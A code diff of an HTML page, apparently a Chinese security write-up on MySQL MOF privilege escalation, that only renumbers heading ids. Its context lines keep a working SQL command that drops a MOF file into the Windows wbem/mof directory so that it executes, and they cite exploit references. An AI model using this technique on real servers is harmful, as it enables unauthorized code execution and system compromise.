@@ -60,7 +60,7 @@
 
   </ul>
 
-  <h2 id='id1600'>参考资料</h2>
+  <h2 id='id1946'>参考资料</h2>
 
 <p><a href='http://zone.wooyun.org/content/2273'>mof运行远控</a></p>
 
@@ -70,7 +70,7 @@
 
 <p><a href='http://www.exploit-db.com/exploits/23083/'>exploitdb</a></p>
 
-<h2 id='id1601'>利用代码</h2>
+<h2 id='id1947'>利用代码</h2>
 
 <ol>
 <li>找个可写目录，我这里是C:\recycler\，把如下代码写到nullevt.mof文件里（也就是他源码里的payload）：</li>
@@ -106,7 +106,7 @@ Filter = $EventFilter;
 
 <pre><code>select load_file(&#39;C:\\RECYCLER\\nullevt.mof&#39;) into dumpfile &#39;c:/windows/system32/wbem/mof/nullevt.mof&#39;;</code></pre>
 
-<h2 id='id1602'>分析</h2>
+<h2 id='id1948'>分析</h2>
 
 <p>本质上是写权限变可执行权限,将mof文件写入特定目录,导致其被执行.</p>
 
